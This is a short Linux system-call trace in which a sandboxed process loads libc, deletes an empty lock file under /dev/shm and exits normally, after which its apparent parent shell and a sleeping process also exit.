26    14:56:49.878821 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
26    14:56:49.879139 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7f7b3f0ae000
26    14:56:49.879455 mmap(0x7f7b3f0d6000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7f7b3f0d6000
26    14:56:49.879804 mmap(0x7f7b3f25e000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7f7b3f25e000
26    14:56:49.880129 mmap(0x7f7b3f2ad000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7f7b3f2ad000
26    14:56:49.880460 mmap(0x7f7b3f2b3000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f7b3f2b3000
26    14:56:49.880829 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
26    14:56:49.881192 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7b3f0ab000
26    14:56:49.881525 arch_prctl(ARCH_SET_FS, 0x7f7b3f0ab740) = 0
26    14:56:49.881815 set_tid_address(0x7f7b3f0aba10) = 26
26    14:56:49.882101 set_robust_list(0x7f7b3f0aba20, 24) = 0
26    14:56:49.882388 rseq(0x7f7b3f0ac060, 0x20, 0, 0x53053053) = 0
26    14:56:49.882814 mprotect(0x7f7b3f2ad000, 16384, PROT_READ) = 0
26    14:56:49.883131 mprotect(0x7f7b3f2c5000, 4096, PROT_READ) = 0
26    14:56:49.883449 mprotect(0x55ae085e7000, 4096, PROT_READ) = 0
26    14:56:49.883753 mprotect(0x7f7b3f2ff000, 8192, PROT_READ) = 0
26    14:56:49.884079 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
26    14:56:49.884392 munmap(0x7f7b3f2c0000, 7295) = 0
26    14:56:49.884730 getrandom("\x5d\xbd\x7b\x7a\x5c\x66\x2d\x3b", 8, GRND_NONBLOCK) = 8
26    14:56:49.885031 brk(NULL)         = 0x55ae3e7b2000
26    14:56:49.885318 brk(0x55ae3e7d3000) = 0x55ae3e7d3000
26    14:56:49.885629 ioctl(0<pipe:[589]>, TCGETS, 0x7fff2ce2e110) = -1 ENOTTY (Inappropriate ioctl for device)
26    14:56:49.885955 newfstatat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", {st_mode=S_IFREG|000, st_size=0, ...}, AT_SYMLINK_NOFOLLOW) = 0
26    14:56:49.886302 unlinkat(AT_FDCWD</sandbox>, "/dev/shm/.cache_bak/update.lock", 0) = 0
26    14:56:49.886695 lseek(0<pipe:[589]>, 0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
26    14:56:49.887050 close(0<pipe:[589]>) = 0
26    14:56:49.887383 close(1<pipe:[2809]>) = 0
26    14:56:49.887722 close(2<pipe:[2810]>) = 0
26    14:56:49.888069 exit_group(0)     = ?
26    14:56:49.888685 +++ exited with 0 +++
9     14:56:49.888848 <... wait4 resumed>[{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 26
9     14:56:49.889062 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, {sa_handler=0x63f00dda8750, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x79f01427e330}, 8) = 0
9     14:56:49.889494 ioctl(2<pipe:[2810]>, TIOCGWINSZ, 0x7fff19398f90) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:49.889920 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.890305 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=26, si_uid=1001, si_status=0, si_utime=0, si_stime=0} ---
9     14:56:49.890499 wait4(-1, 0x7fff19398910, WNOHANG, NULL) = 0
9     14:56:49.891011 rt_sigreturn({mask=[]}) = 0
9     14:56:49.891788 read(0<pipe:[589]>, "", 1) = 0
9     14:56:49.892341 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:49.892806 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:49.893307 exit_group(0)     = ?
9     14:56:49.894452 +++ exited with 0 +++
21    14:56:51.262626 <... clock_nanosleep resumed>0x7ffe8cf9f1d0) = 0
21    14:56:51.263139 close(1<pipe:[2809]>) = 0
21    14:56:51.263638 close(2<pipe:[2810]>) = 0
21    14:56:51.264010 exit_group(0)     = ?
21    14:56:51.264804 +++ exited with 0 +++
